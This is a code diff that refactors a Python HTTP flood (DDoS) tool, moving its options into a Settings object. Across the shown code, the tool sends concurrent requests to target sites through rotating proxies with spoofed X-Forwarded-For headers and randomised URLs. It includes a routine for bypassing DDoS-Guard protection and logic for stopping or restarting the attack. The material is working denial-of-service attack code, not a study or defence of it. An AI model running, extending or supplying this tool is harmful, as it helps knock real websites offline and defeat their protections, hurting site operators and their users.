@@ -11,7 +11,7 @@ import os
 from collections import defaultdict
 from itertools import cycle
 from random import randint
-from typing import Iterable, List, Tuple, Dict, Optional
+from typing import Iterable, List, NamedTuple, Tuple, Dict, Optional
 import urllib.parse as urlparse
 from urllib.parse import urlencode
 
@@ -34,9 +34,32 @@ URL_STATUS_STATS = defaultdict(lambda: defaultdict(int))
 DDOS_GUARD_COOKIE_CACHE = TTLCache(maxsize=100, ttl=timedelta(hours=1), timer=datetime.now) # 3h is min __ddg5 lifetime, __ddg2 lives 1 year
 UA_FALLBACK = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
 
-async def make_request(url: str, target_url: str, proxy: Proxy, timeout: int, headers: Dict[str, str], ignore_response: bool,
-                       stop_attack_on_forbidden: bool, reset_errors_on_success: bool):
-    timeout = aiohttp.ClientTimeout(total=timeout)
+
+class Settings(NamedTuple):
+    target_url: str
+    target_urls_file: str
+    proxy_url: str
+    proxy_file: str
+    concurrency: int
+    count: int
+    timeout: int
+    verbose: bool
+    ignore_response: bool
+    with_random_get_param: bool
+    user_agent: str
+    log_to_stdout: bool
+    restart_period: int
+    random_xff_ip: bool
+    custom_headers_dict: Dict[str, str]
+    stop_attack: int
+    shuffle_proxy: bool
+    proxy_custom_format: str
+    stop_attack_on_forbidden: bool
+    reset_errors_on_success: bool
+
+
+async def make_request(url: str, target_url: str, proxy: Proxy, headers: Dict[str, str], settings: Settings):
+    timeout = aiohttp.ClientTimeout(total=settings.timeout)
     logging.debug('Url: %s Proxy: %s header: %s', url, proxy, headers)
     base_url = target_url.split('?', 1)[0]
     try:
@@ -53,15 +76,15 @@ async def make_request(url: str, target_url: str, proxy: Proxy, timeout: int, he
         async with client_session as session:
             cookies = DDOS_GUARD_COOKIE_CACHE.get(base_url)
             async with session.get(url, cookies=cookies, ssl=False, **request_kwargs) as response:
-                if not ignore_response:
+                if not settings.ignore_response:
                     await response.text()
 
                 if response.status == HTTPStatus.FORBIDDEN and response.headers["server"].lower() == "ddos-guard":
-                    ddos_guard_cookies, response = await ddos_guard.bypass(url, response.cookies, session=session, ignore_response=ignore_response)
+                    ddos_guard_cookies, response = await ddos_guard.bypass(url, response.cookies, session=session, ignore_response=settings.ignore_response)
                     DDOS_GUARD_COOKIE_CACHE[base_url] = ddos_guard_cookies
-                elif response.status >= HTTPStatus.INTERNAL_SERVER_ERROR or (stop_attack_on_forbidden and response.status == HTTPStatus.FORBIDDEN):
+                elif response.status >= HTTPStatus.INTERNAL_SERVER_ERROR or (settings.stop_attack_on_forbidden and response.status == HTTPStatus.FORBIDDEN):
                     URL_ERRORS_COUNT[base_url] += 1
-                elif reset_errors_on_success:
+                elif settings.reset_errors_on_success:
                     URL_ERRORS_COUNT[base_url] = 0
 
                 URL_STATUS_STATS[base_url][response.status] += 1
@@ -114,33 +137,29 @@ def split_target(target: str):
 
 
 async def ddos(
-        target: str, timeout: int, count: int, proxy_iterator: Iterable[Proxy],
-        with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool,
-        custom_headers: Dict[str, str], ua: UserAgent, stop_attack: int, stop_attack_on_forbidden: bool,
-        reset_errors_on_success: bool,
+        target: str, proxy_iterator: Iterable[Proxy], ua: UserAgent, settings: Settings
 ):
     target_url, target_headers = split_target(target)
     step = 0
     while True:
-        if count and step > count:
+        if settings.count and step > settings.count:
             break
 
         base_url = target_url.split('?', 1)[0]
         error_count = URL_ERRORS_COUNT[base_url]
-        if stop_attack and error_count > stop_attack:
+        if settings.stop_attack and error_count > settings.stop_attack:
             logging.warning(
                 "Stopping attack on %s as the error count %d is more than the threshold %d",
                 target_url,
                 error_count,
-                stop_attack,
+                settings.stop_attack,
             )
             break
         step += 1
         proxy = get_proxy(proxy_iterator)
-        headers = make_headers(user_agent, random_xff_ip, custom_headers, target_headers, ua)
-        await make_request(prepare_url(target_url, with_random_get_param), target_url, proxy,
-                           timeout, headers, ignore_response, stop_attack_on_forbidden,
-                           reset_errors_on_success)
+        headers = make_headers(settings.user_agent, settings.random_xff_ip, settings.custom_headers_dict, target_headers, ua)
+        await make_request(prepare_url(target_url, settings.with_random_get_param), target_url, proxy,
+                           headers, settings)
         log_stats()
 
 
@@ -151,18 +170,14 @@ def log_stats():
 
 
 async def amain(
-        targets: List[str], timeout: int, concurrency: int, count: int, proxies: List[Proxy],
-        with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool,
-        custom_headers: Dict[str, str], ua: UserAgent, stop_attack: int, stop_attack_on_forbidden: bool,
-        reset_errors_on_success: bool,
+        targets: List[str], proxies: List[Proxy], ua: UserAgent, settings: Settings,
 ):
     coroutines = []
     proxy_iterator = cycle(proxies or [])
     for target in targets:
-        for _ in range(concurrency):
+        for _ in range(settings.concurrency):
             coroutines.append(
-                ddos(target, timeout, count, proxy_iterator, with_random_get_param, user_agent, ignore_response,
-                     random_xff_ip, custom_headers, ua, stop_attack, stop_attack_on_forbidden, reset_errors_on_success)
+                ddos(target, proxy_iterator, ua, settings)
             )
     await asyncio.gather(*coroutines)
 
@@ -206,36 +221,16 @@ def build_targets(target_urls: Tuple[str], target_urls_files: Tuple[str]) -> Lis
     return list(set(normalized_urls))
 
 
-def process(
-        target_urls: Tuple[str], target_urls_files: Tuple[str], proxy_url: str, proxy_file: str,
-        concurrency: int, count: int, timeout: int, with_random_get_param: bool,
-        user_agent: str, verbose: bool, ignore_response: bool, log_to_stdout: bool, random_xff_ip: bool,
-        custom_headers: Dict[str, str], stop_attack: int, shuffle_proxy: bool, proxy_custom_format: str,
-        stop_attack_on_forbidden: bool, reset_errors_on_success: bool
-):
-    config_logger(verbose, log_to_stdout)
+def process(settings: Settings):
+    config_logger(settings.verbose, settings.log_to_stdout)
     uvloop.install()
     set_limits()
-    proxies = load_proxies(proxy_file, proxy_url, shuffle=shuffle_proxy, custom_format=proxy_custom_format)
-    targets = build_targets(target_urls, target_urls_files)
+    proxies = load_proxies(settings.proxy_file, settings.proxy_url, shuffle=settings.shuffle_proxy, custom_format=settings.proxy_custom_format)
+    targets = build_targets(settings.target_url, settings.target_urls_file)
     ua = UserAgent(fallback = UA_FALLBACK)
     loop = asyncio.get_event_loop()
     loop.run_until_complete(
-        amain(targets,
-              timeout,
-              concurrency,
-              count,
-              proxies,
-              with_random_get_param,
-              user_agent,
-              ignore_response,
-              random_xff_ip,
-              custom_headers,
-              ua,
-              stop_attack,
-              stop_attack_on_forbidden,
-              reset_errors_on_success
-        )
+        amain(targets, proxies, ua, settings)
     )
     for key, value in STATS.items():
         if key != 'success':
@@ -276,24 +271,41 @@ def merge_headers(custom_headers: str, header: List[Tuple[str, str]]) -> Dict[st
 @click.option('--stop-attack-on-forbidden', help='Stop attack takes into account errors like time outs and 5xx, if this flag is set, stop attack on forbidden as well', is_flag=True, default=False)
 @click.option('--reset-errors-on-success', help='If number of errors more than the threshold we stop attack, reset the error counter if a request succeeds', is_flag=True, default=False)
 def main(
-        target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
+        target_url: List[str], target_urls_file: str, proxy_url: str, proxy_file: str,
         concurrency: int, count: int, timeout: int, verbose: bool, ignore_response: bool, with_random_get_param: bool,
-        user_agent: str, log_to_stdout: str, restart_period: int, random_xff_ip: bool, custom_headers: str,
+        user_agent: str, log_to_stdout: bool, restart_period: int, random_xff_ip: bool, custom_headers: str,
         stop_attack: int, shuffle_proxy: bool, header: List[Tuple[str, str]], proxy_custom_format: str,
         stop_attack_on_forbidden: bool, reset_errors_on_success: bool,
 ):
     config_logger(verbose, log_to_stdout)
     if not target_urls_file and not target_url:
         raise SystemExit('--target-url or --target-urls-file is required')
-    custom_headers_dict = merge_headers(custom_headers, header)
+    settings = Settings(
+        target_url=target_url,
+        target_urls_file=target_urls_file,
+        proxy_url=proxy_url,
+        proxy_file=proxy_file,
+        concurrency=concurrency,
+        count=count,
+        timeout=timeout,
+        verbose=verbose,
+        ignore_response=ignore_response,
+        with_random_get_param=with_random_get_param,
+        user_agent=user_agent,
+        log_to_stdout=log_to_stdout,
+        restart_period=restart_period,
+        random_xff_ip=random_xff_ip,
+        custom_headers_dict=merge_headers(custom_headers, header),
+        stop_attack=stop_attack,
+        shuffle_proxy=shuffle_proxy,
+        proxy_custom_format=proxy_custom_format,
+        stop_attack_on_forbidden=stop_attack_on_forbidden,
+        reset_errors_on_success=reset_errors_on_success,
+    )
     while True:
         proc = multiprocessing.Process(
             target=process,
-            args=(target_url, target_urls_file, proxy_url, proxy_file,
-                  concurrency, count, timeout, with_random_get_param,
-                  user_agent, verbose, ignore_response, log_to_stdout, random_xff_ip,
-                  custom_headers_dict, stop_attack, shuffle_proxy, proxy_custom_format,
-                  stop_attack_on_forbidden, reset_errors_on_success)
+            args=(settings,)
         )
         proc.start()
         proc.join(restart_period)
